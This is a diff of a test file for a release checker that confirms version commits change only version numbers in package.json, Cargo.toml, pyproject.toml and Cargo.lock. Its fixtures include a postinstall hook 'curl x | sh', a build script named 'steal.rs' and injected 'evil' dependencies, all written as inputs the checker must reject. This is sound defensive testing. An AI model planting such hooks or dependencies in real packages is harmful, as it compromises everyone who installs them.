@@ -299,10 +299,16 @@ describe("a release's version commit sets the version and nothing else", () => {
     expect(onlyVersionChanged("package.json", pkg("1.2.3"), pkg("1.2.4", { dependencies: { "evil-pkg": "1.0.0" } }), "1.2.4", "1.2.3")).toBe(false);
     expect(onlyVersionChanged("package.json", pkg("1.2.3"), pkg("1.2.4", { scripts: { test: "bun test", postinstall: "curl x | sh" } }), "1.2.4", "1.2.3")).toBe(false);
     expect(onlyVersionChanged("Cargo.toml", '[package]\nversion = "1.2.3"\n', '[package]\nversion = "1.2.4"\nbuild = "steal.rs"\n', "1.2.4", "1.2.3")).toBe(false);
-    // A dependency's pin in the lock file is not the product's own entry.
-    const cargoLock = (own: string, dep: string) => `[[package]]\nname = "app"\nversion = "${own}"\n\n[[package]]\nname = "serde"\nversion = "${dep}"\n`;
+    // A dependency's version written as a table's own line, set to the release's number.
+    const table = (serde: string) => `[package]\nname = "app"\nversion = "1.2.3"\n\n[dependencies.serde]\nversion = "${serde}"\n`;
+    expect(onlyVersionChanged("Cargo.toml", table("1.0"), table("1.2.4").replace('version = "1.2.3"', 'version = "1.2.4"'), "1.2.4", "1.2.3")).toBe(false);
+    expect(onlyVersionChanged("pyproject.toml", '[project]\nname = "app"\nversion = "1.2.3"\ndependencies = ["requests"]\n', '[project]\nname = "app"\nversion = "1.2.4"\ndependencies = ["requests", "evil"]\n', "1.2.4", "1.2.3")).toBe(false);
+    // In the lock file only the product's own (local) entries move; a registry package's pin never does.
+    const cargoLock = (own: string, dep: string) => `version = 3\n\n[[package]]\nname = "app"\nversion = "${own}"\n\n[[package]]\nname = "serde"\nversion = "${dep}"\nsource = "registry+https://github.com/rust-lang/crates.io-index"\nchecksum = "abc"\n`;
     expect(onlyVersionChanged("Cargo.lock", cargoLock("1.2.3", "1.0.0"), cargoLock("1.2.4", "1.0.0"), "1.2.4", "1.2.3")).toBe(true);
-    expect(onlyVersionChanged("Cargo.lock", cargoLock("1.2.3", "1.0.0"), cargoLock("1.2.4", "1.2.4"), "1.2.4", "1.2.3")).toBe(false);
+    expect(onlyVersionChanged("Cargo.lock", cargoLock("1.2.3", "1.2.3"), cargoLock("1.2.4", "1.2.4"), "1.2.4", "1.2.3")).toBe(false);
+    // A first release has no previous version: its lock file does not change at all.
+    expect(onlyVersionChanged("Cargo.lock", cargoLock("1.2.3", "1.0.0"), cargoLock("1.2.4", "1.0.0"), "1.2.4")).toBe(false);
     // Version files at any depth (a monorepo's packages), and nothing else.
     expect(isVersionFile("apps/desktop/package.json")).toBe(true);
     expect(isVersionFile("src/index.ts")).toBe(false);
